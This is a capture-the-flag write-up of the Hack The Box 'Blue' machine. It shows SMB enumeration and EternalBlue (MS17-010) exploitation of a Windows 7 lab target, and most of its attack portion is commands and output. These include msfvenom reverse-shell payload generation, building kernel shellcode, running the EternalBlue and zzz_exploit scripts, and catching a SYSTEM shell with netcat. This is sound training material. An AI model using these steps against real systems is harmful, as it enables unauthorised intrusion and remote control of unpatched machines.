# Blue

Just the name makes me think of eternalblue, but lets see


```
kali@kali:~/htb/Blue$ sudo nmap -sV -sC 10.129.87.153 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-25 21:07 EST
Nmap scan report for 10.129.87.153
Host is up (0.028s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 1s, median: 1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-01-26T02:08:33+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-26T02:08:35
|_  start_date: 2021-01-26T02:06:57

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.74 seconds
```

Lets try a quick smbmap.

```
kali@kali:~/htb/Blue$ smbmap -H 10.129.87.153 -u null
[+] Guest session       IP: 10.129.87.153:445   Name: 10.129.87.153                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        Users                                                   READ ONLY

```

Ok so we have read access on Share and Users. Lets see what we can do with SMBClient:

```
kali@kali:~/htb/Blue$ smbclient //10.129.87.153/Users -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                8362495 blocks of size 4096. 4259492 blocks available
smb: \> 
```

The -N here just means no password.

Great, now we know we have some access. I’m going to mount this smbshare:

```
kali@kali:~/htb/Blue$ sudo mkdir /mnt/smbmount
kali@kali:~/htb/Blue$ sudo mount -t cifs //10.129.87.153/Users /mnt/smbmount -o username=null,password=null,domain=WORKGROUP,rw
kali@kali:~/htb/Blue$ cd /mnt/smbmount
kali@kali:/mnt/smbmount$ ls
Default  desktop.ini  Public
```

-t cifs means to mount the type Common Internet File System. 

-o means options

The rw at the end just means read/write permissions.

I can’t really find anything good here. So I’m going to see if I can use EternalBlue.

Checking the Eternalblue readme we can find some good information:

`* **eternalblue_exploit7.py** Eternalblue exploit for windows 7/2008` 

I also run the checker:

```
kali@kali:~/htb/Blue$ python checker.py 10.129.87.153
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
kali@kali:~/htb/Blue$ 
```

So the target is not patched, but we don’t have any pipes to use zzz_exploit.

Let’s see what exploit7 needs.

```
kali@kali:~/htb/Blue$ python eternalblue_exploit7.py -h
eternalblue_exploit7.py <ip> <shellcode_file> [numGroomConn]
```

Ok so we need the shellcode. We can use msfvenom for that:


```
kali@kali:~/htb/Blue$ sudo msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread LHOST=10.10.14.21 LPORT=1337 -f raw > shellcode[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
```

Ok let's try:

```
kali@kali:~/htb/Blue$ python eternalblue_exploit7.py 10.129.87.153 shellcode
shellcode size: 460
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
Traceback (most recent call last):
  File "eternalblue_exploit7.py", line 563, in <module>
    exploit(TARGET, sc, numGroomConn)
  File "eternalblue_exploit7.py", line 544, in exploit
    conn.disconnect_tree(tid)
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/smb.py", line 2815, in disconnect_tree
    self.recvSMB()
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/smb.py", line 2521, in recvSMB
    r = self._sess.recv_packet(self.__timeout)
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/nmb.py", line 914, in recv_packet
    data = self.__read(timeout)
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/nmb.py", line 997, in __read
    data = self.read_function(4, timeout)
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/nmb.py", line 981, in non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.
```

Ok, let’s try x86 maybe? Doesn’t work either. 

```
kali@kali:~/AutoBlue-MS17-010/shellcode$ sudo ./shell_prep.sh
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
Y
LHOST for reverse connection:
10.10.14.21                                                                                                                                          
LPORT you want x64 to listen on:                                                                                                                     
1337                                                                                                                                                 
LPORT you want x86 to listen on:                                                                                                                     
1338                                                                                                                                                 
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell                                                                          
1                                                                                                                                                    
Type 0 to generate a staged payload or 1 to generate a stageless payload                                                                             
1                                                                                                                                                    
Generating x64 cmd shell (stageless)...                                                                                                              

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.21 LPORT=1337
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.21 LPORT=1338
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
kali@kali:~/AutoBlue-MS17-010/shellcode$  
```

I downloaded Autoblue to generate the shellcode. Maybe I messed up when doing it manually. It also merges it into one. For x86 and x64.

I tried restarting the box as well. Hoping that would fix the issue. Since it was connecting really slow. Did not work. Let’s try the third way of creating the shellcode:

```
kali@kali:~/AutoBlue-MS17-010/shellcode$ sudo nasm -f bin eternalblue_kshellcode_x64.asm -o eblue.bin
kali@kali:~/AutoBlue-MS17-010/shellcode$ sudo msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread LHOST=10.10.14.21 LPORT=1337 -f raw -o msf.bin 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: msf.bin
kali@kali:~/AutoBlue-MS17-010/shellcode$ cat eblue.bin msf.bin > payload.bin
kali@kali:~/AutoBlue-MS17-010/shellcode$ cd ..
kali@kali:~/AutoBlue-MS17-010$ python eternalblue_exploit7.py 10.129.26.106 shellcode/payload.bin
shellcode size: 1232
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```

First we are using creating a binary from the assembly code.

Then we are creating a reverse shell binary with msfvenom

We are then adding them together, The eternalblue binary first, followed by the reverse shell.


And on the listener:

```
kali@kali:~/htb/Blue$ sudo nc -nlvp 1337
[sudo] password for kali: 
Listening on 0.0.0.0 1337
Connection received on 10.129.26.106 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

I don’t know if the additional reset, or the different shellcode worked. But I got it working in the end :)

## Comparing myself to the official writeup:

They just use metasploit. A quick 3 step process.

But on the manual directions, they point out that you can use zzz_exploit.py, when I used the checker.py script, it did not return any named pipes. But the writeup says we can use ntsvcs. So let’s try that:

What we have to do is change USERNAME = “” to = “//” on around line 30 in the zzz_exploit script.

And of course modify our payload in the script.

And I can confirm it works:

```
kali@kali:~/htb/Blue$ python zzz_exploit.py 10.129.26.106 ntsvcs
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa80044abba0
SESSION: 0xfffff8a001571ae0
FLINK: 0xfffff8a00942f088
InParam: 0xfffff8a00942915c
MID: 0x3c03
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.129.26.106.....
Creating service kZis.....
Starting service kZis.....
The NETBIOS connection with the remote host timed out.
Removing service kZis.....
ServiceExec Error on: 10.129.26.106
nca_s_proto_error
Done
kali@kali:~/htb/Blue$ 
```

And

```
kali@kali:~/AutoBlue-MS17-010/shellcode$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.26.106 49160
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```


## How to stop this exploit:

Update the system. MS17-010
